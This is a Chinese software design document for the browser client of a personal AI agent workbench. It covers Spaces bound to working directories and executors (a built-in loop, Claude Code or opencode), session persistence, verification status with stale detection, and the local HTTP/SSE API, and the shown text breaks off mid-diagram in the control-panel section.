# 客户端界面设计（W 里程碑：个人 AI 工作台）

> 状态：W1~W5 已实现（W5 = 控制面板：指挥台 / 消息 / 备忘）。知识库入口留给 M7。
> 控制面板消息已补：外部文本弹层看全文、点开 30 分钟后自动归档、`sa inbox push` 外部投递（见 10.11）。
> 任务终态已分流：只有失败进消息，完成 / 取消只在指挥台显示，指挥台刷新后从后台恢复近 24 小时的任务卡（见 10.12）。
> 对话里模型的回复按 Markdown 渲染（标题 / 列表 / 表格 / 引用 / 链接），零依赖手写，图片不加载（见 10.13）。
> 新建空间已拆成「目录形态 × 执行者」两个正交维度（见 4 与 10.9）；外部 CLI 的启动器仍留 M8。
> W1~W5 只改 `src/`，不动核心 loop 的默认行为。
> 前置：M3（会话 JSONL 持久化 + 权限），M4（daemon / 定时任务）只影响“控制面板”的填充内容，不阻塞骨架。

## 1. 目标与非目标

**目标**

1. 一个两栏桌面客户端：左栏功能区（导航 + 空间列表），右栏工作区（当前会话）。
2. 引入**空间（Space）**概念：一类任务的固定容器，绑定工作目录和执行它的 agent。
3. 空间里只显示最近 5 个运行过的 session，其余折叠隐藏，避免左栏越长越乱。
4. 两类任务定义：通用任务（无专有目录，用 tmp）、绑定外部 agent 的执行空间（进目录、认得 claude code / opencode），并显示**验证状态**，方便在不同任务间切换。

**非目标（这一版不做）**

- 不做多窗口 / 分屏对比。
- 不做云端同步、多人协作。
- 不做插件市场。
- 客户端不承载业务逻辑：所有状态在 Python 侧，客户端只渲染事件 + 发命令（沿用 [ARCHITECTURE.md](../ARCHITECTURE.md#m2-起就要守住的接口约定)）。

## 2. 术语与概念模型

```
Space（空间）──1:N── Session（会话/一次运行实例）
   │                    │
   │ 绑定 cwd + agent    │ 消息流、用量、验证状态
   │                    │
   └── 控制面板 / 知识库是全局入口，不属于任何空间
```

| 术语 | 含义 | 对应现在的类/文件 |
|---|---|---|
| **Space** | 一类任务的容器：名字 + 目录 + 用哪个 agent 跑 + 验证方式 | `spaces/models.py` |
| **Session** | 一次具体的运行，等价于现在的 `Session`（消息历史 + 用量） | `agent/session.py` |
| **Task** | 用户口中的“任务”，在本设计里**不单独建模**，就是 Session。一个空间=一类任务的集合=该空间下所有 session | — |
| **kind（目录形态）** | 在哪儿跑：`generic`（自动分配 tmp）/ `agent`（进指定 `cwd`） | `Space.kind` |
| **executor（执行者）** | 谁跑：`simpleagent`（内置 loop）/ `claude-code` / `opencode` | `Space.executor` + `EXECUTORS` |
| **模型** | 内置执行者看 `profile`；外部 CLI 看 `cli_model`（`None` = 用它本机默认配置） | `Space.profile` / `Space.cli_model` |
| **验证状态** | 这个 session 跑完后，验证命令的结果：未验证 / 验证中 / 已验证 / 失败 / 已失效 | `spaces/verify.py` |

**一句话**：空间决定“在哪儿、用什么跑”（两个正交维度），session 决定“这一轮具体跑什么、跑得对不对”。

## 3. 界面结构

```
┌──────────────────────┬────────────────────────────────────────────────┐
│ 左栏 功能区 (300px)   │ 右栏 工作区 (flex)                              │
│                      │                                                │
│ ── 固定入口 ──        │ ┌ 面包屑：空间名 / session 标题                 │
│ [+ 新建 Agent]       │ │   [CC]  ~/dev/SimpleAgent                     │
│   控制面板            │ │   已验证 ✓   3.2k tokens   [停止][重跑][验证] │
│   知识库              │ ├──────────────────────────────────────────────┤
│                      │ │ 对话 | 变更(2) | 文件 | 日志                  │
│ ── 打开的空间 (3) ──  │ ├──────────────────────────────────────────────┤
│ ▾ 临时整理      [通用]│ │                                              │
│   ~/…/spaces/a1/tmp  │ │  消息流：                                     │
│   ● 整理下载目录  运行中│ │   👤 把 tests/ 下重复 fixture 提出来         │
│   ✓ 统计 py 行数  2h  │ │   🤖 我先看一下目录结构…                      │
│   ✗ 批量重命名   昨天 │ │   ⚙ list_dir(depth=2)          12 行  [展开]  │
│   ○ 试算 token   周一 │ │   ⚙ edit_file(...)             diff [展开]   │
│   查看全部 (12)      │ │   ✅ 验证通过 uv run pytest -q · 1.8s         │
│                      │ │                                              │
│ ▾ SimpleAgent   [CC] │ ├──────────────────────────────────────────────┤
│   /Users/…/SimpleAgent│ │ [ deepseek ▾ ]  输入…  @引用  /命令   [发送] │
│   ● 修 pytest 临时目录│ └──────────────────────────────────────────────┘
│   ○ 写 changelog 3h  │
│ ▾ 实验区        [OC] │
│   /tmp/opencode-lab  │
└──────────────────────┴────────────────────────────────────────────────┘
```

### 3.1 左栏上半：三个固定入口

| 入口 | 作用 | 状态 |
|---|---|---|
| **新建空间**（主按钮） | 打开新建空间向导：① 名字 ② 任务形态（通用 / 绑定目录）③ 执行者（simpleagent / claude-code / opencode）④ 模型（随执行者切换：profile 或外部 CLI 的模型）⑤ 权限（仅外部执行者：只读 / 全放行）⑥ 工作目录（仅绑定目录）⑦ 可选验证命令 | 本次设计 |
| **控制面板** | 全局视图：正在跑的 session（跨空间聚合）、定时任务（`schedules.toml`，M4）、模型 profile 与用量统计、最近错误 / trace 入口、设置 | 骨架本次设计，内容随 M4/M6 填 |
| **知识库** | 记忆（`memory/` + `MEMORY.md`，M7）、skills 列表、导入的文档与索引 | M7 再实现，本次只留入口和空态 |

### 3.2 左栏下半：打开的空间

- 只列**已打开**的空间（`space.toml` 里 `opened=true`），关闭（×）只是从列表移除，不删数据。
- 每个空间卡片显示：
  - 名称 + 类型徽标：`通用` / `CC`(claude code) / `OC`(opencode) / `SA`(内置)
  - 工作目录（末尾截断，hover 显示全路径，点击在 Finder 打开）
  - 验证汇总：`✓ 3 / 5`（最近 5 个里已验证的数量）
- 卡片内列出**最近 5 个运行 session**（规则见 3.3），每条：状态点 + 标题 + 相对时间 + 验证标记。
- 超出的折叠为「查看全部 (N)」，点开展开完整列表（带搜索和按状态筛选）。
- 排序：运行中置顶，其余按 `updated_at` 倒序；手动置顶（pin）的常驻，不占 5 个名额。
- 顶部一个搜索框，跨空间搜 session 标题和消息内容（v1 只搜标题，`grep` 全文留到后面）。

### 3.3 最近 5 个 session 的保留规则

| 规则 | 说明 |
|---|---|
| 默认展示 | 每个空间最多 5 条，按 `updated_at` 倒序 |
| 运行中 | 永远置顶且不被挤出；跑完仍在列表里 |
| 置顶 | 用户 pin 的 session 常驻，不占用 5 个名额 |
| 隐藏 | 第 6 条起收进「查看全部」，**不是删除** |
| 清理 | 空间可配 `keep_sessions`（默认 50），超出只归档不删；`sa spaces gc` 手动清理 N 天前的 |

### 3.4 右栏：工作区

- **头部**：面包屑（空间 / session）+ agent 徽标 + 工作目录 + 验证状态 + token 用量 + 操作（新建 session、停止、重跑、跑验证、导出 markdown）。
- **Tab**：对话（默认）/ 变更（文件 diff 列表，来自 `edit_file` / `write_file` 事件）/ 文件（当前 cwd 树）/ 日志（trace、请求用量、错误）。
- **消息流**：用户消息、助手文本（流式）、思考内容（可折叠）、工具调用卡（默认折叠，显示工具名+关键参数+结果行数，展开看完整输出）、审批卡（允许 / 拒绝 / 本次会话始终允许）、错误卡。
- **输入区**：多行输入、模型 profile 切换、`@` 引用文件、`/` 命令（`/compact`、`/model`、`/verify` 等）、发送 / 停止。

## 4. 空间的两个正交维度

空间由两个**互不干涉**的选择决定：「在哪儿跑」（`kind`，目录形态）和「谁跑」（`executor`，
执行者）。四种组合都合法，向导里就是两个独立的下拉框：

| | `executor = "simpleagent"`（默认） | `executor = "claude-code"` / `"opencode"` |
|---|---|---|
| `kind = "generic"` | 随手一问（默认组合） | 临时任务交给 claude 跑，产物落 tmp |
| `kind = "agent"`（进指定目录） | 在项目里用内置 loop | 在项目里让 claude / opencode 干活 |

**模型**这一栏也随执行者分两套口径：

- `executor = "simpleagent"` → 选 `profile`（`config.toml` 里那批），交给内置客户端；
- `executor` 是外部 CLI → 选 `cli_model`。**缺省（`None`）= 本机默认**：不注入任何 env / args，
  启动函数只是把 `claude` / `opencode` 在那个目录里拉起来，完全吃它自己的配置。
  填了 preset 才把「我们的配置」拼进启动参数（preset 机制还没做，见 10.9）。

**建好之后能切执行者**（左栏卡片上的 ⚙「空间设置」，`PATCH /api/spaces/{id}` 带 `executor`）：

- 切换只影响**新会话**。会话的执行者在创建时锁在 `meta.agent` 里，runner 按它分路，不看 `space.executor`；
- 老会话的历史在原执行者那边（内置的在 `sessions/model/`，外部 CLI 的在它自己那里，我们只存 resume id），
  接不过去，所以 `meta.agent != space.executor` 的会话只读：能看、能导出，发消息 / 重跑返回 409。切回原执行者即可继续；
- 空间有会话在跑时不许切（409）；`kind` / `cwd`（在哪儿跑）不开放修改。

### 4.1 通用任务（`kind = "generic"`）

- **没有专有目录**：工作目录自动分配为 `~/.simpleagent/spaces/<space-id>/tmp/`，空间创建时建好。
- 适用：临时整理、一次性计算、随手一问。产物默认留在 tmp 里，随时可清空。
- 默认执行者是内置 `simpleagent` loop；也可以选外部 CLI（工作目录照样是 tmp）。
- 可选 `pin_dir`：如果用户想把产物放别处（比如下载目录），单独指定，仍然算通用空间。

### 4.2 绑定目录（`kind = "agent"`）

- 绑定**一个真实项目目录**（`cwd`，顶层字段），进入该目录执行；不填就落回 tmp（API 会拦）。
- 执行者可以是内置 `simpleagent`（在项目里用自己的 loop），也可以是外部 CLI：
  `claude-code` / `opencode`。外部 CLI 用无头模式（`claude -p --output-format stream-json
  --verbose`、`opencode run --format json`），保存对面的 session id，下次追问带 `--resume` /
  `--session` 接上；事件翻译见 10.10。
- 外部 CLI 的 `cwd` 是**进程的工作目录**。注意 opencode 会从 cwd 往上找 git 根当作项目根，
  所以把 cwd 指在仓库的子目录时，它实际操作的是仓库根目录。
- 右栏头部与左栏卡片都显示「当前是谁在跑」（SA / CC / OC 徽标），切换执行者时 session id 一起换掉。
- 同一个目录可以开多个空间（例如一个跑 claude code、一个跑 opencode 做对比），互不干扰。

### 4.3 验证状态（verification）

**来源**，两条，优先级从高到低：

1. **自动**：空间配了 `[verify].command`（如 `uv run pytest -q && uv run ruff check`），在 cwd 里跑，用**退出码**判定。触发时机 `on_stop`（session 结束时，默认）/ `on_turn`（每轮结束）/ `off`。
2. **手动**：用户点「标记为已验证」；或外部 agent 跑完测试后由 hook 上报（M8）。

**取值**

| 值 | 含义 | 显示 |
|---|---|---|
| `unknown` | 没跑过验证 | 灰色 ○ 未验证 |
| `running` | 正在跑 | 蓝色 ◐ 验证中 |
| `passed` | 退出码 0 | 绿色 ✓ 已验证 |
| `failed` | 非 0 | 红色 ✗ 未通过 |
| `stale` | 验证通过后又有新的文件写入 | 黄色 ⚠ 已失效 |

`stale` 是关键：它让“验证”不会骗人。判定方式——记录验证时的文件指纹（cwd 下 tracked 文件的 mtime+size 的哈希），之后有写工具改动文件就置为 `stale`。

**字段**

```python
@dataclass
class Verification:
    status: str  # unknown|running|passed|failed|stale
    command: str | None
    exit_code: int | None
    started_at: str | None
    finished_at: str | None
    output_ref: str | None  # 完整输出落盘路径（复用 tool_outputs 那套）
    fingerprint: str | None  # 验证通过时的目录指纹，用于判 stale
    source: str  # auto|manual
```

左栏 session 行右侧一个小标记、右栏头部一个大 chip、右栏「日志」tab 里有完整输出，三处同源。

## 5. 数据模型与落盘

### 5.1 目录

```
~/.simpleagent/
  config.toml
  spaces/
    <space-id>/
      space.toml              # 空间定义（可变，唯一真值）
      tmp/                    # 通用空间的工作目录（kind=generic）
      sessions/
        <session-id>.jsonl    # 消息流，只追加：界面显示实际发生过什么
        <session-id>.meta.json# 可变元信息：标题/状态/验证/时间戳/pin
        model/
          <session-id>.jsonl  # 模型看到的历史（M6）：SessionStore 的操作记录，含清理、压缩、中断修复
  tool_outputs/
  traces/
```

**为什么 meta 拆成单独文件**：jsonl 只追加，但标题、状态、验证结果会变。改 jsonl 中间行要重写整个文件，长期跑下来代价太大，所以可变字段走 sidecar，消息流保持纯追加。

### 5.2 `space.toml`

```toml
id = "sp_a1b2c3"
name = "SimpleAgent 重构"
kind = "agent"                 # 目录形态：generic（用 tmp）| agent（进 cwd）
executor = "claude-code"       # 谁跑：simpleagent | claude-code | opencode
profile = "deepseek"           # executor=simpleagent 时的模型
cli_model = "deepseek"         # executor 是外部 CLI 时的模型 preset；缺省 = 本机默认（不注入）
cwd = "~/dev_code/SimpleAgent" # kind=agent 时必填；generic 不写（用 tmp）
opened = true                  # 是否在左栏显示
pinned = false
created_at = "2026-09-17T14:00:00+08:00"
last_opened_at = "2026-09-17T14:52:00+08:00"
keep_sessions = 50

# 仅 executor != simpleagent：外部 CLI 的启动方式
[agent]
command = "claude"
args = []
resume_flag = "--resume"       # 用于追问，配合 meta 里的 agent_session_id

# 仅 kind = generic；和 [agent] 可以同时存在（通用任务 + 外部 CLI）
# [generic]
# tmp_dir = "auto"             # auto → spaces/<id>/tmp
# pin_dir = ""                 # 可选，想固定产物位置时填

[verify]
command = "uv run pytest -q && uv run ruff check"
trigger = "on_stop"            # off | on_stop | on_turn
timeout = 300
```

磁盘上的 `space.toml` 就是唯一真值，字段与 `Space` dataclass 一一对应（`agent` 段只放
「怎么把 CLI 拉起来」，模型和执行者都在顶层）。W1~W5 写的旧文件（执行者藏在 `[agent].name`、
`cwd` 也在 `[agent]` 里）会被 `_space_from_toml` 自动回填，不用手工迁移。

### 5.3 `<session-id>.meta.json`

```json
{
  "id": "se_9f2a",
  "space_id": "sp_a1b2c3",
  "title": "修 pytest 临时目录权限问题",
  "status": "running",        // running|idle|done|error|cancelled
  "pinned": false,
  "agent": "claude-code",
  "agent_session_id": "0c1f...",  // 外部 agent 的会话 id，用于追问
  "created_at": "2026-09-17T14:10:00+08:00",
  "updated_at": "2026-09-17T14:48:00+08:00",
  "usage": {"prompt_tokens": 12034, "completion_tokens": 2201, "cached_tokens": 8192},
  "verification": {
    "status": "passed", "command": "uv run pytest -q",
    "exit_code": 0, "finished_at": "2026-09-17T14:47:10+08:00",
    "fingerprint": "sha1:...", "source": "auto"
  }
}
```

标题来源（可切，默认 b）：a) 首条用户消息截断 40 字；b) 第一轮结束后用一次便宜的 LLM 调用生成 12 字以内摘要（异步写回，失败就退回 a）。

### 5.4 Python 侧接口

```python
# spaces/store.py
class SpaceStore:
    def list_spaces(self, opened_only: bool = True) -> list[Space]: ...
    def create_space(self, spec: SpaceSpec) -> Space: ...
    def get_space(self, space_id: str) -> Space: ...
    def update_space(self, space_id: str, **fields) -> Space: ...
    def change_executor(self, space_id: str, executor: str, *, profile=None,
                        cli_model=None, permission=SAFE, command=None, args=None) -> Space: ...
    def close_space(self, space_id: str) -> None:          # opened=false，不删数据
    def delete_space(self, space_id: str) -> None:         # 显式删除，需二次确认

    def list_sessions(self, space_id: str, limit: int = 5,
                      include_pinned: bool = True) -> list[SessionMeta]: ...
    def create_session(self, space_id: str, agent: str | None = None) -> Session: ...
    def load_session(self, session_id: str) -> Session: ...   # 读 jsonl 重建消息
    def append_message(self, session_id: str, msg: dict) -> None: ...
    def update_meta(self, session_id: str, **fields) -> None: ...
```

`Session` 仍是 `agent/session.py` 那个 dataclass，只是多了持久化和 meta，核心 loop 不用改。

## 6. 与核心的接口（本地 API）

客户端通过本地 HTTP + SSE 跟后台引擎通信。**不用 WebSocket**：客户端→服务端都是普通请求（发消息、取消、审批），服务端→客户端是单向事件流，SSE 足够，还省一个依赖、断线重连可以直接用 `Last-Event-ID`。

### 6.1 事件帧格式

现有 `Event` 都是 dataclass，加一个统一的 `to_frame()`：

```json
{"seq": 128, "session_id": "se_9f2a", "type": "text_delta", "ts": "...", "payload": {"text": "..."}}
```

`type` 取值：`text_delta` / `reasoning_delta` / `message_done` / `tool_call_start` / `tool_result` / `approval_request` / `verification` / `status` / `usage` / `error` / `max_steps` / `turn_end`。
`seq` 单 session 内单调递增，客户端按 seq 去重、断线后按 `Last-Event-ID` 续传。

### 6.2 路由

| 方法 | 路径 | 用途 |
|---|---|---|
| GET | `/api/spaces` | 空间列表（含每个空间最近 5 个 session） |
| POST | `/api/spaces` | 新建空间（向导提交） |
| PATCH/DELETE | `/api/spaces/{id}` | 改配置 / 关闭或删除 |
| GET | `/api/spaces/{id}/sessions?limit=5` | session 列表 |
| POST | `/api/spaces/{id}/sessions` | 新建 session |
| GET | `/api/sessions/{id}` | 消息历史 |
| POST | `/api/sessions/{id}/input` | 发一条用户输入，触发 run（202） |
| POST | `/api/sessions/{id}/rerun` | 用最后一条用户消息再跑一次 |
| GET | `/api/spaces/{id}/files` | 工作目录文件树（两层，右栏「文件」tab） |
| GET | `/api/spaces/{id}/commands` | 输入框 `/` 菜单要列的技能（只有内置 loop 的普通空间有；见 design/slash-completion.md） |
| POST | `/api/sessions/{id}/verify` | 手动跑验证 |
| PATCH | `/api/sessions/{id}` | 重命名 / 置顶（`title` / `pinned`） |
| PATCH | `/api/sessions/{id}/verification` | 手动标记已验证 |
| GET | `/api/sessions/{id}/events` | SSE 事件流，支持 `Last-Event-ID` 头或 `?last_event_id=N`（头优先） |
| GET | `/api/approvals?status=pending` | 待审批列表 |
| POST | `/api/approvals/{id}` | `{action: allow|deny|always}` |
| GET | `/api/panel/summary` | 控制面板：运行中任务、未读数、待办数、累计用量 |
| GET | `/api/sessions/{id}/summary` | 结构化摘要（改了几个文件 / 工具调用 / 验证状态 / 最后一句） |
| GET | `/api/inbox` | 消息列表：`?view=active\|archived`（默认 active）、`?unread=1` 只看未读；条目只带 `preview`，不带全文 |
| GET | `/api/inbox/count` | `{unread, active, archived}`，左栏角标轮询用 |
| GET | `/api/inbox/{id}` | 消息详情（完整正文 + 状态） |
| POST | `/api/inbox` | 外部消息源投递（定时任务 / 邮件适配器）；不开服务时用 `sa inbox push` |
| POST | `/api/inbox/{id}/read` | 标记已读（开始归档倒计时）并返回更新后的条目，`id` 为 `all` 时全部已读 |
| POST | `/api/inbox/{id}/archive` | 手动归档，不等倒计时 |
| GET/POST | `/api/todos` | 备忘列表 / 新增 |
| PATCH/DELETE | `/api/todos/{id}` | 改（text / done）/ 删 |
| GET | `/api/knowledge/...` | 知识库（M7） |

审批走异步 `approve()` 接口：后台需要确认时推 `approval_request` 事件并挂起，客户端回 POST 后继续；客户端不在线则按无人值守策略拒绝（M3 已定的行为）。

### 6.3 技术选型（待确认）

| 层 | 方案 | 说明 |
|---|---|---|
| 后台 API | A. 标准库 `http.server` + 手写 SSE | 零新依赖，符合“依赖尽量少”原则，学习价值高；路由要自己写几十行 |
| | B. FastAPI + uvicorn（推荐备选） | 两个依赖，SSE、校验、OpenAPI 文档白送；以后换过去接口不变 |
| 客户端壳 | A. 浏览器打开 `localhost:8384`（**建议先做这个**） | 零新语言，交互调得快，能先把布局和事件渲染验证透 |
| | B. Tauri v2 + React/TS | 体积小、用系统 WebView，适合长期；等交互稳定后再包 |
| | C. Electron | 成熟但重（~150MB），本项目没必要 |
| | D. PyWebView | 同进程直接用 Python，省 IPC；打包和前端生态弱 |

建议路径：**先 A+A**（标准库后台 + 浏览器前端），把 UI 结构和事件协议定下来；等布局不再大改，再决定要不要包 Tauri。核心代码不受影响。

## 7. 分期实现计划

| 期 | 内容 | 验证方式 |
|---|---|---|
| **W1** | 持久化层：`spaces/` 目录结构、`space.toml`、`meta.json`、`SpaceStore`、session 追加/恢复、最近 5 条规则、置顶 | ✅ 已实现 + 单测（13 个），详见 `src/simpleagent/spaces/` 与 `tests/spaces/test_store.py` |
| **W2** | 本地 API：`sa serve` + 路由 + SSE 事件帧 + 取消 + 审批回转 | ✅ 已实现 + 单测（6 个）。`src/simpleagent/serve/`：bus（seq+重放）/ frames / approval（审批桥）/ runner（后台 asyncio 线程）/ app（http.server 路由+SSE）。用 FakeLLM 起服务，`curl -N` 看 SSE 帧序；断言审批挂起→POST→继续 均通过 |
| **W3** | 客户端骨架：两栏布局、左栏三个入口 + 空间列表（最近 5 + 查看全部）、右栏头部/对话/输入，能发消息并流式渲染 | ✅ 已实现 + 单测（5 个）。`src/simpleagent/web/`（index.html / styles.css / app.js，零依赖原生 JS）+ `serve/static.py`（importlib.resources 读资源）。手动：`sa serve` → 浏览器开 `http://127.0.0.1:8384/` → 新建空间 → 发一句话 → 看到流式输出；刷新页面后消息还在 |
| **W4** | 工具调用卡、审批卡、停止/重跑、验证状态（verify 命令执行、stale 判定、三处同源显示） | ✅ 已实现 + 单测。`spaces/verify.py`（目录指纹 + `changed_since`）；runner 在写工具成功后比对指纹，变了就把 `passed` 降级为 `stale` 并发帧；新增 `POST /api/sessions/{id}/rerun` 与 `GET /api/spaces/{id}/files`；前端补齐变更 / 文件 / 日志三个 tab。冒烟：写文件 → 验证通过 → 再写文件 → 徽标变「已失效」 |
| **W5** | 控制面板：指挥台（@空间名 下发任务 / 查状态 / 完成摘要）、消息（inbox）、备忘（todos） | ✅ 已实现 + 单测（9 个）。`panel/store.py`（inbox 只追加 + read.json；todos 原子写）、`panel/summary.py`（结构化摘要，不调模型）。冒烟：下发任务 → 跑完自动落一条系统消息 → 面板读到未读 1 |

W1 不依赖任何 UI，可以现在就做；W2 之后每一步都能单独跑起来看效果。

## 8. 待确认

1. **客户端技术栈**：先浏览器 + 后续 Tauri，还是直接上 Tauri/Electron？（我建议前者）
2. **“验证”的口径**：只要命令退出码，还是要解析测试输出（如 `12 passed`）？需不需要人工确认也算？
3. **通用空间的 tmp**：每个空间一个 tmp 目录（好清理、但产物分散），还是共用一个全局 tmp？
4. **空间与目录的关系**：允许同一目录开多个空间（对比不同 agent）吗？我默认允许。
5. **“打开的空间”是否持久化**：重启客户端后恢复上次打开的空间，我默认是（写 `opened` 字段）。
6. **session 标题**：首条消息截断，还是额外调一次模型生成摘要（多花一次调用）？
7. **并行**：要不要支持多个空间的 session 同时跑？（核心是全异步，能做；UI 上要考虑运行中任务的全局提示）
8. **左栏下半除了空间，要不要放“最近文件/最近改动”**：先不放，避免左栏过载；需要的话放控制面板。

## 9. W1 / W2 实现备注

### 9.1 核心层的极薄注入点（默认行为不变）
W2 给核心 loop 加了三个注入点，**不传则完全保持旧行为**（REPL 不感知）：
- `ToolContext` 增加 `session_id` 与 `approver` 两个字段（默认 `None`）。
- `ToolRegistry` 增加 `approver` 参数；执行**写操作**（`readonly=False`）前先 `await approver.request(...)`，被拒绝则返回错误结果、不真正执行。只读工具直接放行。
- `Agent` 增加 `approver` 参数，把 `session_id`/`approver` 透传进 `ToolContext`；并新增 `cancel()`（取消底层 asyncio 任务，loop 会先修好历史再抛 `CancelledError`）。

这三个点是 ARCHITECTURE 里早就规划的「审批器是异步接口」，M3 也会复用，不是为 W2 临时加的。

### 9.2 后台线程模型
- `Runner` 自己起一个线程跑独立的 asyncio 事件循环；HTTP 层（`http.server` + `ThreadingHTTPServer`）在另一线程。
- 两边通过**线程安全的事件总线**（`queue.Queue` + `Lock`，不依赖 asyncio）解耦：runner 发布帧，SSE handler 阻塞取帧。
- 审批的「挂起 / 恢复」用 asyncio `Future`：`APIApprover.request()` 推一帧 `approval_request` 后 `await future`；HTTP 层 `POST /api/approvals/{id}` 通过 `loop.call_soon_threadsafe(future.set_result, ...)` 在 runner 线程上唤醒它。
- 验证命令用 `subprocess.run` + `asyncio.to_thread`，避免 asyncio 子进程 watcher 在非主线程 loop 上不好使。

### 9.3 与原始草案的差异
- 草案里验证命令只挂在 agent 类空间。实现中 `Space.from_spec` 给**两类空间都支持** `verify`（generic 也能跑 `pytest` 之类），修复了原 `from_spec` 在 generic 分支提前 return 漏掉 verify 的 bug。
- 帧类型在草案 6.1 的基础上补了 `status` / `error` / `verification` 三种服务端补充帧（`approval_request` 沿用草案命名）。
- `Space` 新增 `to_dict()`、`SpaceStore` 新增 `find_session_space()`（按 session id 跨空间定位），供 API 直接按 session id 访问。

## 10. W3 实现备注（客户端骨架）

### 10.1 文件与托管方式

- 前端三件套放在 `src/simpleagent/web/`（`index.html` / `styles.css` / `app.js`），由 `serve/static.py` 用 `importlib.resources` 读取——不依赖进程的工作目录，将来打包成 wheel 或二进制照样能用。
- 路由两条：`/` 与 `/index.html` → `index.html`，`/assets/<name>` → 同名文件。`asset_bytes()` 内部只取 `PurePosixPath(name).name` 并要求后缀在白名单里，目录穿越在这一层就被掐掉。
- `Response` 原来只支持 JSON body，W3 给它加了 bytes 分支（`_dispatch` 里判断 `isinstance(resp.body, (bytes, bytearray))`），其余路由不受影响。
- 样式沿用 `docs/design/client-ui-mockup.html` 里定过的 CSS 变量（浅色），不重新设计配色。

### 10.2 三个踩到的坑

1. **EventSource 收不到带 `event:` 名的帧。** 服务端 SSE 发的是 `id / event / data` 三行，`event` 是帧类型（`text_delta` 等）。`onmessage` 只处理默认事件，必须 `addEventListener("text_delta", ...)` 逐个类型注册，否则一条帧都收不到。`app.js` 顶部维护了一个 `FRAME_TYPES` 列表来做这件事。
2. **正常结束时没有状态帧。** 原来只有取消 / 出错才发 `status` 帧，跑完一轮客户端会一直停在「运行中」，发送按钮不解禁。改成在 `Runner._finalize()` 这个收口处统一 `publish(status_frame(...))`，成功 / 取消 / 出错三条路径都会发。
3. **启动失败会静默（已修）。** `_build_agent()` 和「落盘用户消息」这两步原本在 `try` 之外，异常被 `run_coroutine_threadsafe` 返回的 future 吞掉——客户端一条帧都收不到，界面永远停在「运行中」，排查时连日志都没有。典型触发：没配 API key、profile 不存在、cwd 不存在。现在这两步也包进 try，失败时发 `error` + `status(error)` 两帧并落盘 `status=error`；另外给 `_schedule` 加了 `add_done_callback` 兜底日志，以后协程里漏出的异常至少会在 stderr 留痕。

### 10.3 顺带补的后端小接口

- `GET /api/meta`：返回 `profiles`、`default_profile`、`max_steps`。新建空间向导要列 profile，前端不该硬编码。
- `GET /api/spaces/{id}/sessions?limit=N`：左栏默认 5 条；点「查看全部」时前端带 `limit=50`。上限 200，防止一次性拖垮。

### 10.4 前端的取舍

- 零依赖、零构建：原生 DOM + `fetch` + `EventSource`，没有 React/Vue，也没有 npm。理由见 6.3 的 A 方案——先把布局和事件协议验证透，等稳定了再决定要不要包 Tauri。
- 模型输出不当 HTML 执行：最初是先 `escapeHtml` 再解析极简 Markdown（代码块 / 行内代码）；对话里的回复后来换成了完整一些的渲染器 `web/markdown.js`，同样保证原文全部转义（见 10.13）。
- 消息流不轮询：历史走 `GET /api/sessions/{id}`，增量只走 SSE；`seq` 用于去重（断线重放时浏览器会自动带 `Last-Event-ID`）。
- 后台标签页不占 SSE：浏览器对同一 host 只给 6 条 HTTP/1.1 连接，每个标签页挂一条 SSE，开到第 6 个后新请求全卡在排队里（创建空间点了没反应）。所以 `visibilitychange` 切到后台就断开，回到前台用 `?last_event_id=<lastSeq>` 续传。普通请求另设 20s 超时，排队卡住时至少报个错。
- 左栏刷新（新 session、状态变化）会重画空间列表，但**不重画右栏消息流**，避免打断正在看的上下文。

### 10.5 首轮打磨（W3 之后补的）

骨架跑通后补的一批体验项，都不新增概念，只是把 3.x 里写了但没做的补上：

- **会话重命名 / 置顶**：新增 `PATCH /api/sessions/{id}`（`title` / `pinned`）。重命名走行内 input（回车保存、Esc 取消），不用 `prompt()`——原生弹窗放在这个界面里很跳。置顶由 `SpaceStore.list_sessions` 保证常驻且不占 5 个名额（W1 就实现了，这次只是把接口开出来）。
- **刷新后回到原位**：`localStorage` 记住上次打开的 `spaceId/sessionId`，启动时自动重选。
- **自动滚动只在贴底时生效**：距离底部 >120px 就认定用户在往上翻，不再被流式输出拽回去。
- **运行中计时**：底部状态栏每秒刷新已用时，结束时显示「完成，用时 N 秒」。
- **导出 Markdown**：把当前会话的消息流导出成 `.md`（用户/助手分节，工具调用与结果进代码块）。
- **斜杠命令**：`/verify` / `/model <profile>` / `/help`，都是纯前端就能完成的，没有新增后端接口。
- **空间卡片验证汇总**：`✓ 通过数/最近会话数`，对应 3.2 里的「验证汇总」。

### 10.6 W4 实现备注（工具卡 / 审批 / 验证状态）

**stale 怎么判**（4.3 那条「让验证不会骗人」的落地方式）：

- 新增 `spaces/verify.py`：`fingerprint(cwd)` 取目录下 tracked 文件的 `(相对路径, mtime_ns, size)` 哈希，遍历复用 `tools/walk.iter_files` 的忽略规则——和 `list_dir` / `grep` 看到的是同一批文件，不会出现「工具认为没改、指纹认为改了」的错位。文件数封顶 5000，够判「有没有变」就行。
- 验证**通过时**才冻结指纹（写进 `verification.fingerprint`）。失败的结果本来就要重跑，没有「失效」一说。
- 触发时机：`Runner._on_event` 收到 `ToolResult` 且工具**不是只读**（用 `ToolRegistry.is_readonly` 判定，不用硬编码名单）且没报错时，比对当前指纹与冻结值，不同就把 `passed` 改成 `stale`，落盘并推 `verification` 帧。
- 用指纹而不是「跑过写工具就 stale」：`bash` 也是写工具，但 `ls` 之类并不改文件，指纹没变就不该让验证失效。

**三处同源**：左栏 session 行的 ✓/✗/⚠、右栏头部 chip、日志 tab 里的完整信息，都读 `meta.verification` 这一份；`stale` 走的是同一条 `verification` 帧，所以三处会同时变。

**两个新接口**：

- `POST /api/sessions/{id}/rerun`：取 jsonl 里最后一条 user 消息重发。改了 prompt 或换了模型后想重试时用；没有用户消息或非纯文本时 400。
- `GET /api/spaces/{id}/files`：工作目录文件树，只取两层、条目封顶 300。定位文件用，不做成文件管理器——真要深挖让 agent 用 `list_dir` / `glob`。

**前端三个 tab**：都是切过去时才拉数据（`switchTab` 里按需渲染），不会每收到一帧就重算。变更 tab 从消息流里把 `write_file` / `edit_file` 的调用与结果配对（`edit_file` 的返回本身就是 unified diff，直接显示）；日志 tab 展示用量明细、验证命令与输出、疑似报错的工具结果条数。

`Verification` 加了一个 `output` 字段（截断 2000 字）：原来 `output` 不在 dataclass 里，`from_dict` 会把它丢掉，日志 tab 就看不到验证输出了。完整输出仍应走设计里的 `output_ref` 落盘，这次没做。

### 10.7 W5 控制面板

点左栏「控制面板」时，**只有右栏换成面板**，左栏空间列表不动（还是能随时点回某个会话）。面板内部再分两栏：

```
┌ 状态带：运行中 · 未读消息 · 待办 · 累计 tokens ┐
├───────────────────┬──────────────────────────┤
│ 指挥台             │ 消息                      │
